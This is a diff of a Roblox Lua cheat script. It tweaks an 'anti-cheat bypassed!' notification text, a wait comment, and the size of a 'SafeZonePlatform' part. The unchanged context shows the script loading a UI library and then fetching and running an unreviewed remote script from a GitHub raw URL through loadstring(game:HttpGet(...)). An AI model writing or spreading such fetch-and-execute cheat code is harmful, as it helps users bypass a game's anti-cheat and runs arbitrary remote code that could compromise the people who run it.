@@ -11,12 +11,12 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 -- Mostrar notificação inicial
 Rayfield:Notify({
-    Title = "SURPRISE =] [Credits:juão]",
+    Title = "=] SURPRISE, Credits: juão",
     Content = "anti-cheat bypassed!",
     Duration = 10
 })
 
--- Aguarda 3 segundos e executa o loadstring remoto
+-- Aguarda 1 segundos e executa o loadstring remoto
 task.wait(1)
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
@@ -69,7 +69,7 @@ local function CreateSafeZone()
 
     local part = Instance.new("Part")
     part.Name = "SafeZonePlatform"
-    part.Size = Vector3.new(100, 2, 100)
+    part.Size = Vector3.new(40, 1, 40)
     part.Position = platformPos
     part.Anchored = true
     part.CanCollide = true
